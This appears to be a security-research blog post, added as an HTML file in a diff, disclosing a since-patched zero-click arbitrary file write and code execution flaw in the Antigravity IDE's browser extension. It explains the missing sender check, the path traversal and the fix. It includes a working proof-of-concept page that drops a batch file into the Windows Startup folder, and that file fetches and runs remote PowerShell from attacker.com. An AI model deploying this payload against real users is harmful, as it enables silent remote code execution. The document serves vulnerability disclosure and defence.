@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zero-Click RCE in Google DeepMind's Antigravity</title>
+    <meta name="description" content="Any website you visit could silently write files anywhere on your system. A critical vulnerability analysis.">
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+</head>
+<body>
+    <div class="progress-bar" id="progressBar"></div>
+
+    <nav class="navbar">
+        <div class="nav-content">
+            <a href="../../" class="logo">Security Research</a>
+            <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+                <svg class="sun-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="5"></circle>
+                    <path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"></path>
+                </svg>
+                <svg class="moon-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                </svg>
+            </button>
+        </div>
+    </nav>
+
+    <article class="article">
+        <header class="article-header">
+            <div class="article-meta">
+                <span class="tag critical">Critical Vulnerability</span>
+                <span class="tag">Zero-Click</span>
+                <span class="tag">RCE</span>
+            </div>
+            <h1 class="article-title">Zero-Click RCE in Google DeepMind's Antigravity</h1>
+            <p class="article-subtitle">Any website you visit could silently write files anywhere on your system.</p>
+            <div class="article-info">
+                <time datetime="2025-11-27">November 27, 2025</time>
+                <span class="separator">|</span>
+                <span>25 min read</span>
+                <span class="separator">|</span>
+                <span>CVSS 9.8</span>
+            </div>
+        </header>
+
+        <aside class="toc-container">
+            <div class="toc" id="toc">
+                <h3>Table of Contents</h3>
+                <nav id="tocNav"></nav>
+            </div>
+        </aside>
+
+        <div class="article-content">
+            <section id="introduction">
+                <h2>Introduction</h2>
+                <p>AI assistants are evolving beyond simple chatbots. The new generation can see your screen, click buttons, fill forms, and interact with your browser in ways that blur the line between software and user.</p>
+                <p>Google DeepMind's Antigravity is one such tool. It's an AI browser assistant that doesn't just answer questions—it takes action. And with that power comes an expanded attack surface that most security models haven't caught up with.</p>
+                <p>While analyzing Antigravity's browser extension, I discovered a critical vulnerability that allowed any website to write arbitrary files to a user's system. No clicks required. No prompts. No warnings.</p>
+                <div class="callout callout-danger">
+                    <strong>Impact:</strong> Visiting a malicious webpage could drop an executable into your Windows Startup folder, achieving persistent code execution on next reboot.
+                </div>
+            </section>
+
+            <section id="architecture">
+                <h2>Part 1: Understanding the Full Architecture</h2>
+                <p>Google launched Antigravity IDE on November 18, 2025—a fork of VS Code with AI agents built in. The agents can write code, edit files, run terminal commands, and control a browser. When you ask it to do something in a browser, a Chrome window opens, the agent navigates and clicks around, and everything gets recorded as a video artifact.</p>
+                <p>I wanted to know how it worked. So I treated it as a black box and worked backwards.</p>
+
+                <h3>The Entry Point: The Agent's Tools</h3>
+                <p>The investigation started with the agent itself. I asked it to look at its own system instructions, and it revealed this tool definition:</p>
+                <pre><code class="language-plaintext">Tool: browser_subagent
+Start a browser subagent to perform actions in the browser with the given task
+description. The subagent has access to tools for both interacting with web page
+content (clicking, typing, navigating, etc) and controlling the browser window
+itself (resizing, etc).
+
+Note: All browser interactions are automatically recorded and saved as WebP
+videos to the artifacts directory.</code></pre>
+                <p>This was the first clue. The tool isn't a direct command like <code>click()</code> or <code>type()</code>. It's a request to start a <strong>sub-agent</strong>. The main agent delegates the high-level goal ("Go to Google") to this sub-agent, and it handles the details.</p>
+
+                <h3>Tracing the Process Tree</h3>
+                <p>My first step was standard reconnaissance. If there's a browser window open, there must be a process running it:</p>
+                <pre><code class="language-bash">$ ps aux | grep Chrome
+/Applications/Google Chrome.app/Contents/MacOS/Google Chrome \
+  --remote-debugging-port=9222 \
+  --user-data-dir=/Users/user/.gemini/antigravity-browser-profile \
+  --disable-fre --no-default-browser-check</code></pre>
+                <p>Chrome with <strong>remote debugging enabled on port 9222</strong>. This is the Chrome DevTools Protocol (CDP) interface:</p>
+                <pre><code class="language-bash">$ curl http://127.0.0.1:9222/json/version
+{"Browser":"Chrome/131.0.6778.0","Protocol-Version":"1.3",...}</code></pre>
+                <p>Following the process tree revealed the orchestrator:</p>
+                <pre><code class="language-bash">$ ps -ef | grep language_server
+/Applications/Antigravity.app/.../language_server_macos_arm \
+  --extension_server_port 53410 \
+  --api_server_url http://jetski-server.corp.goog \
+  --csrf_token [REDACTED]</code></pre>
+
+                <p><strong>"Jetski"</strong>—that was the internal codename. The Language Server listens on multiple ports:</p>
+
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Port</th>
+                                <th>Purpose</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>53410</td><td>Extension Server (gRPC-Web, CSRF protected)</td></tr>
+                            <tr><td>53412-53413</td><td>LSP channels for code intelligence</td></tr>
+                            <tr><td>53422</td><td>Additional service channel</td></tr>
+                            <tr><td>9222</td><td>Chrome DevTools Protocol</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3>Cracking the Binary</h3>
+                <p>The Language Server was a compiled Go binary—no source code to read. But Go binaries retain debug strings, and the <code>strings</code> command revealed handler filenames:</p>
+                <pre><code class="language-bash">$ strings language_server_macos_arm | grep -i "cortex/handlers" | head -10
+third_party/jetski/cortex/handlers/browser_subagent_handler.go
+third_party/jetski/cortex/handlers/browser_click_element_handler.go
+third_party/jetski/cortex/handlers/browser_press_key_handler.go
+third_party/jetski/cortex/handlers/browser_scroll_handler.go
+third_party/jetski/cortex/handlers/capture_browser_screenshot_handler.go
+third_party/jetski/cortex/handlers/read_browser_page_handler.go</code></pre>
+                <p>No source code, but the filenames were enough. Combined with Antigravity's documentation, I could infer the tool structure: <code>browser_subagent_handler.go</code> orchestrates automation, while other handlers manage specific actions.</p>
+
+                <h3>The Architecture</h3>
+                <p>Putting it all together:</p>
+                <pre><code class="language-plaintext">┌─────────────────────────────────────────────────────────┐
+│  Antigravity IDE (VS Code Fork)                         │
+└─────────────────────┬───────────────────────────────────┘
+                      │
+                      ▼
+┌─────────────────────────────────────────────────────────┐
+│  Jetski Server + Gemini Model                           │
+└─────────────────────┬───────────────────────────────────┘
+                      │
+                      ▼
+┌─────────────────────────────────────────────────────────┐
+│  Language Server (Cortex) - gRPC-Web, File System       │
+└─────────────────────┬───────────────────────────────────┘
+                      │
+                      ▼
+┌─────────────────────────────────────────────────────────┐
+│  Browser Extension  ⚠️  externally_connectable: all_urls │
+└─────────────────────┬───────────────────────────────────┘
+                      │
+                      ▼
+┌─────────────────────────────────────────────────────────┐
+│  Chrome Browser (CDP on port 9222)                      │
+└─────────────────────────────────────────────────────────┘</code></pre>
+
+                <h3>The Complete Tool Arsenal</h3>
+                <p>Using <code>strings</code> and grepping for patterns like <code>browser.</code> and <code>fs.</code>, I mapped the tool names from the handler filenames (e.g., <code>browser_click_element_handler.go</code> → <code>browser.click_element</code>):</p>
+                <div class="tool-grid">
+                    <div class="tool-category">
+                        <h4>Browser Navigation</h4>
+                        <ul>
+                            <li>browser.open_url</li>
+                            <li>browser.click_element</li>
+                            <li>browser.press_key</li>
+                            <li>browser.select_option</li>
+                            <li>browser.input</li>
+                        </ul>
+                    </div>
+                    <div class="tool-category">
+                        <h4>Browser Scrolling</h4>
+                        <ul>
+                            <li>browser.scroll</li>
+                            <li>browser.scroll_up</li>
+                            <li>browser.scroll_down</li>
+                        </ul>
+                    </div>
+                    <div class="tool-category">
+                        <h4>Browser Capture</h4>
+                        <ul>
+                            <li>browser.get_dom</li>
+                            <li>browser.read_page</li>
+                            <li>browser.capture_screenshot</li>
+                            <li>browser.capture_console</li>
+                            <li>browser.execute_javascript</li>
+                        </ul>
+                    </div>
+                    <div class="tool-category">
+                        <h4>File System</h4>
+                        <ul>
+                            <li>fs.view_file_range</li>
+                            <li>fs.list_directory</li>
+                            <li>fs.write_file</li>
+                            <li>fs.delete_knowledge_path</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <section id="red-flag">
+                <h2>Part 2: The First Red Flag</h2>
+                <p>When analyzing any browser extension, the first thing I check is <code>manifest.json</code>. It's essentially a declaration of the extension's capabilities and trust boundaries.</p>
+                <p>One field immediately caught my attention:</p>
+                <pre><code class="language-json">{
+  "externally_connectable": {
+    "matches": ["&lt;all_urls&gt;"]
+  }
+}</code></pre>
+                <div class="callout callout-warning">
+                    This configuration means <strong>every website on the internet</strong> can send messages directly to this extension using <code>chrome.runtime.sendMessage()</code>.
+                </div>
+                <p>Most extensions either don't use this field at all, or restrict it to specific trusted domains. Using <code>&lt;all_urls&gt;</code> is essentially saying: <em>"I trust every website to communicate with me."</em></p>
+                <p>For an extension that can trigger file writes, this is a significant design decision worth investigating.</p>
+            </section>
+
+            <section id="attack-surface">
+                <h2>Part 3: Mapping the Attack Surface</h2>
+                <p>With external messaging enabled for all URLs, the next step was understanding what messages the extension accepts and what they can do.</p>
+
+                <h3>Exposed External API</h3>
+                <p>The extension exposes several message handlers to external websites. Most are low-risk utility functions, but one stood out:</p>
+                <ul>
+                    <li><code>rpcCall.*</code> — UI control functions (Low risk)</li>
+                    <li><code>getCurrentTabId</code>, <code>getMimeType</code> — Tab info (Low risk)</li>
+                    <li><code>CHECK_JETSKI_CONNECTION</code> — Reveals if Antigravity is running (Info leak)</li>
+                    <li><strong><code>SaveScreenRecording</code> — Writes files to disk (CRITICAL)</strong></li>
+                </ul>
+            </section>
+
+            <section id="vulnerability">
+                <h2>Part 4: The Vulnerability</h2>
+                <p>The <code>SaveScreenRecording</code> handler is designed to save screen recordings from the extension's internal offscreen document. It accepts a message containing:</p>
+                <ul>
+                    <li><code>za</code> — File contents as a byte array</li>
+                    <li><code>filename</code> — The name of the file to create</li>
+                    <li><code>L</code> — A path component for organizing recordings</li>
+                </ul>
+                <p>These parameters are passed to the Language Server, which writes the file to:</p>
+                <pre><code class="language-plaintext">C:\Users\{username}\.gemini\antigravity\brain\{L}\{filename}</code></pre>
+
+                <div class="callout callout-danger">
+                    <strong>Critical Issue:</strong> The handler never validates who sent the message.
+                </div>
+
+                <div class="comparison-box">
+                    <div class="comparison-item expected">
+                        <h4>Expected Flow</h4>
+                        <div class="flow">
+                            <span class="node safe">Offscreen Document (Trusted)</span>
+                            <span class="arrow">→</span>
+                            <span class="node safe">Service Worker (Validates)</span>
+                            <span class="arrow">→</span>
+                            <span class="node">Language Server</span>
+                            <span class="arrow">→</span>
+                            <span class="node">Disk</span>
+                        </div>
+                    </div>
+                    <div class="comparison-item actual">
+                        <h4>Actual Flow</h4>
+                        <div class="flow">
+                            <span class="node danger">Any Website (Untrusted)</span>
+                            <span class="arrow">→</span>
+                            <span class="node warning">Service Worker (No validation!)</span>
+                            <span class="arrow">→</span>
+                            <span class="node">Language Server</span>
+                            <span class="arrow">→</span>
+                            <span class="node danger">Disk</span>
+                        </div>
+                    </div>
+                </div>
+
+                <p>The handler code from <code>service-worker.js</code> (deobfuscated):</p>
+                <pre><code class="language-javascript">// service-worker.js - SaveScreenRecording handler
+case 11:  // SaveScreenRecording
+    // Validates message SHAPE, not ORIGIN
+    if (!a || typeof a !== "object" ||
+        a.action !== "SaveScreenRecording" ||
+        typeof a.za !== "object" ||      // Recording data (byte array)
+        typeof a.filename !== "string" || // Output filename
+        typeof a.L !== "string") {        // Path component
+        break;
+    }
+
+    // Build protobuf message
+    B = new Qg;
+    Rg(B, new Uint8Array(a.za));   // File contents - ATTACKER CONTROLLED
+    cd(B, 2, a.filename);           // Filename - ATTACKER CONTROLLED
+    cd(B, 3, a.L);                  // Path - ATTACKER CONTROLLED
+
+    // Send to Language Server - writes file to disk
+    return z(n, dh(B).then(...), 16);</code></pre>
+                <p>The <code>sender</code> parameter is passed to the handler function but never used. Any website can invoke this functionality.</p>
+            </section>
+
+            <section id="path-traversal">
+                <h2>Part 5: Path Traversal</h2>
+                <p>With the ability to control both <code>filename</code> and <code>L</code> (the path component), the next question was: can we escape the intended directory?</p>
+                <p>The answer is <strong>yes</strong>. No sanitization is performed on these inputs.</p>
+
+                <div class="path-demo">
+                    <div class="path-example normal">
+                        <h4>Intended Behavior</h4>
+                        <div class="path-breakdown">
+                            <span class="path-part base">Base: .gemini/antigravity/brain/</span>
+                            <span class="path-part normal">L = 'session123'</span>
+                            <span class="path-part normal">filename = 'recording.webm'</span>
+                            <span class="path-result">Result: brain/session123/recording.webm</span>
+                        </div>
+                    </div>
+                    <div class="path-example exploit">
+                        <h4>Exploited Behavior</h4>
+                        <div class="path-breakdown">
+                            <span class="path-part base">Base: .gemini/antigravity/brain/</span>
+                            <span class="path-part danger">L = '../../../Desktop'</span>
+                            <span class="path-part danger">filename = 'payload.bat'</span>
+                            <span class="path-resolution">Path: brain/../../../Desktop/</span>
+                            <span class="path-result danger">Result: C:/Users/victim/Desktop/payload.bat</span>
+                        </div>
+                    </div>
+                </div>
+                <p>By including <code>../</code> sequences in the <code>L</code> parameter, we can write files anywhere the user has write permissions.</p>
+            </section>
+
+            <section id="code-execution">
+                <h2>Part 6: Achieving Code Execution</h2>
+                <p>With arbitrary file write established, achieving code execution is straightforward on Windows. The Startup folder is a well-known persistence mechanism—any executable or script placed there runs automatically when the user logs in.</p>
+
+                <div class="attack-chain">
+                    <div class="chain-step">
+                        <span class="step-num">1</span>
+                        <span class="step-title">Victim visits malicious page</span>
+                        <span class="step-detail">https://evil.com/cats.html</span>
+                    </div>
+                    <div class="chain-arrow"></div>
+                    <div class="chain-step">
+                        <span class="step-num">2</span>
+                        <span class="step-title">JavaScript sends message</span>
+                        <span class="step-detail">chrome.runtime.sendMessage()</span>
+                    </div>
+                    <div class="chain-arrow"></div>
+                    <div class="chain-step">
+                        <span class="step-num">3</span>
+                        <span class="step-title">Extension forwards to LS</span>
+                        <span class="step-detail">No origin validation</span>
+                    </div>
+                    <div class="chain-arrow"></div>
+                    <div class="chain-step">
+                        <span class="step-num">4</span>
+                        <span class="step-title">File written to Startup</span>
+                        <span class="step-detail">Path traversal exploit</span>
+                    </div>
+                    <div class="chain-arrow"></div>
+                    <div class="chain-step danger">
+                        <span class="step-num">5</span>
+                        <span class="step-title">Next login = RCE</span>
+                        <span class="step-detail">Attacker code executes</span>
+                    </div>
+                </div>
+
+                <p>The entire attack requires <strong>zero user interaction</strong> beyond visiting a webpage. No clicks, no downloads, no permission prompts.</p>
+
+                <h3>Proof of Concept</h3>
+                <div class="video-container">
+                    <div class="video-wrapper">
+                        <iframe src="https://drive.google.com/file/d/1WJaPxNqA5vAFWytp9_n2yJNU4CH6YgTs/preview" allowfullscreen></iframe>
+                    </div>
+                    <div class="video-caption">
+                        <span class="video-badge">POC Demo</span>
+                        <span>Zero-Click RCE Exploitation in Action</span>
+                    </div>
+                </div>
+                <pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Cute Cat Pictures&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Welcome! Loading cats...&lt;/h1&gt;
+&lt;script&gt;
+// Executes immediately on page load - zero interaction required
+const payload = `@echo off
+powershell -w hidden -ep bypass -c "IEX(curl http://attacker.com/shell.ps1)"
+`;
+
+chrome.runtime.sendMessage("eeijfnjmjelapkebgockoeaadonbchdd", {
+    action: "SaveScreenRecording",
+    za: Array.from(new TextEncoder().encode(payload)),
+    filename: "WindowsUpdate.bat",
+    L: "../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+});
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            </section>
+
+            <section id="root-causes">
+                <h2>Part 7: Root Causes</h2>
+                <p>Three separate issues combined to create this vulnerability:</p>
+
+                <div class="root-causes">
+                    <div class="root-cause">
+                        <div class="cause-header">
+                            <span class="cause-num">1</span>
+                            <h4>Overly Permissive External Messaging</h4>
+                        </div>
+                        <div class="cause-code">
+                            <code>externally_connectable: matches: ['&lt;all_urls&gt;']</code>
+                        </div>
+                        <div class="cause-fix">
+                            <strong>Fix:</strong> Restrict to specific trusted domains or remove
+                        </div>
+                    </div>
+                    <div class="root-cause">
+                        <div class="cause-header">
+                            <span class="cause-num">2</span>
+                            <h4>Missing Sender Validation</h4>
+                        </div>
+                        <div class="cause-code">
+                            <code>function qh(message, sender) { /* sender never checked! */ }</code>
+                        </div>
+                        <div class="cause-fix">
+                            <strong>Fix:</strong> Verify sender is trusted offscreen document
+                        </div>
+                    </div>
+                    <div class="root-cause">
+                        <div class="cause-header">
+                            <span class="cause-num">3</span>
+                            <h4>No Path Sanitization</h4>
+                        </div>
+                        <div class="cause-code">
+                            <code>path = base + user_L + user_filename // Direct concatenation!</code>
+                        </div>
+                        <div class="cause-fix">
+                            <strong>Fix:</strong> Canonicalize path, verify stays within bounds
+                        </div>
+                    </div>
+                </div>
+
+                <p>Any one of these issues being addressed would have prevented exploitation.</p>
+            </section>
+
+            <section id="fix">
+                <h2>Part 8: The Fix</h2>
+                <p>Google addressed the vulnerability in version 1.11.3 by adding proper sender validation:</p>
+
+                <pre><code class="language-javascript">// service-worker.js (v1.11.3)
+function isAuthorizedSender(sender) {
+  return (
+    sender.url?.includes("/static/offscreen.html") &&
+    sender.id === chrome.runtime.id &&
+    !sender.tab
+  );
+}
+
+// In SaveScreenRecording handler:
+if (!isAuthorizedSender(sender)) {
+  return { error: "Unauthorized" };
+}</code></pre>
+
+                <div class="fix-validation">
+                    <h4>New Validation Logic</h4>
+                    <div class="validation-checks">
+                        <div class="check">
+                            <span class="check-icon">&#10003;</span>
+                            <span>sender.url includes '/static/offscreen.html'?</span>
+                        </div>
+                        <div class="check">
+                            <span class="check-icon">&#10003;</span>
+                            <span>sender.id === chrome.runtime.id?</span>
+                        </div>
+                        <div class="check">
+                            <span class="check-icon">&#10003;</span>
+                            <span>!sender.tab? (not from web page)</span>
+                        </div>
+                    </div>
+                </div>
+
+                <p>Now only the legitimate offscreen document within the extension itself can trigger file saves.</p>
+
+                <div class="callout callout-warning">
+                    <strong>Note:</strong> The path traversal issue was not addressed — the fix only added sender validation. The <code>filename</code> and <code>L</code> parameters are still passed unsanitized to the Language Server.
+                </div>
+            </section>
+
+            <section id="lessons">
+                <h2>Part 9: Lessons Learned</h2>
+                <p>This vulnerability illustrates a broader pattern emerging in AI-powered tools.</p>
+
+                <div class="lessons-grid">
+                    <div class="lesson-category">
+                        <h4>For Extension Developers</h4>
+                        <ul>
+                            <li>Treat <code>externally_connectable</code> with caution</li>
+                            <li>Always validate message senders</li>
+                            <li>Never trust user input for paths</li>
+                            <li>Separate internal/external handlers</li>
+                            <li>Audit minifier output</li>
+                        </ul>
+                    </div>
+                    <div class="lesson-category">
+                        <h4>For Security Researchers</h4>
+                        <ul>
+                            <li>AI assistants = high-value targets</li>
+                            <li>manifest.json reveals trust model</li>
+                            <li>Minification obscures but doesn't protect</li>
+                            <li>Check for CDP exposure</li>
+                        </ul>
+                    </div>
+                    <div class="lesson-category">
+                        <h4>For Users</h4>
+                        <ul>
+                            <li>Review extension permissions</li>
+                            <li>Be cautious with AI system tools</li>
+                            <li>Keep extensions updated</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <section id="bigger-picture">
+                <h2>Part 10: The Bigger Picture</h2>
+                <p>MCP (Model Context Protocol) servers aren't just tool providers anymore—they're agent coordinators.</p>
+
+                <div class="perspective-box">
+                    <div class="perspective sophisticated">
+                        <h4>Sophisticated Architecture</h4>
+                        <ul>
+                            <li>Multi-layer agent orchestration</li>
+                            <li>gRPC-Web with CSRF protection</li>
+                            <li>Sandboxed browser automation</li>
+                        </ul>
+                    </div>
+                    <div class="perspective-arrow">→</div>
+                    <div class="perspective reality">
+                        <h4>But Reality...</h4>
+                        <ul>
+                            <li>Single missing sender check</li>
+                            <li>Zero clicks required</li>
+                            <li class="danger">Full system compromise</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <p>The architecture was sophisticated. But a single missing check turned a productivity tool into a zero-click malware delivery system.</p>
+
+                <blockquote class="key-takeaway">
+                    <strong>Always verify who's asking. Always sanitize paths. Always assume external input is malicious.</strong>
+                </blockquote>
+            </section>
+
+            <section id="timeline">
+                <h2>Timeline</h2>
+                <div class="timeline">
+                    <div class="timeline-item">
+                        <span class="timeline-date">Nov 18, 2025</span>
+                        <span class="timeline-event">Antigravity IDE public preview launched</span>
+                    </div>
+                    <div class="timeline-item">
+                        <span class="timeline-date">Nov 19, 2025</span>
+                        <span class="timeline-event">Initial reverse engineering and architecture mapping</span>
+                    </div>
+                    <div class="timeline-item">
+                        <span class="timeline-date">Nov 24, 2025</span>
+                        <span class="timeline-event">SaveScreenRecording vulnerability discovered</span>
+                    </div>
+                    <div class="timeline-item fixed">
+                        <span class="timeline-date">Nov 25, 2025</span>
+                        <span class="timeline-event">Patched with sender validation (v1.11.3)</span>
+                    </div>
+                    <div class="timeline-item">
+                        <span class="timeline-date">Nov 26, 2025</span>
+                        <span class="timeline-event">Report marked as duplicate — bug bounty life 🤷</span>
+                    </div>
+                </div>
+            </section>
+
+            <section id="conclusion">
+                <h2>Conclusion</h2>
+                <p>The attack surface of browser extensions is well-documented, but the integration of AI capabilities introduces new risks. When an AI assistant can see your screen, control your browser, and write files to disk, the stakes of a security lapse increase dramatically.</p>
+                <p>This vulnerability was hiding in plain sight. The manifest declared trust in all URLs. The handler accepted file write requests from anyone. The path traversal was unmitigated. Each issue on its own might seem minor—together, they turned a productivity tool into a zero-click malware delivery system.</p>
+                <p>The code was minified and obfuscated, but the fundamental architecture decisions were visible from the start. <strong>Always verify who's asking.</strong></p>
+
+                <div class="vulnerability-summary">
+                    <div class="summary-item">
+                        <span class="summary-label">Extension ID:</span>
+                        <code>eeijfnjmjelapkebgockoeaadonbchdd</code>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Vulnerable Version:</span>
+                        <span class="version vulnerable">1.11.2</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Fixed Version:</span>
+                        <span class="version fixed">1.11.3</span>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </article>
+
+    <footer class="footer">
+        <p>Security Research Blog</p>
+    </footer>
+
+    <button class="back-to-top" id="backToTop" aria-label="Back to top">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M18 15l-6-6-6 6"></path>
+        </svg>
+    </button>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="../../script.js"></script>
+</body>
+</html>
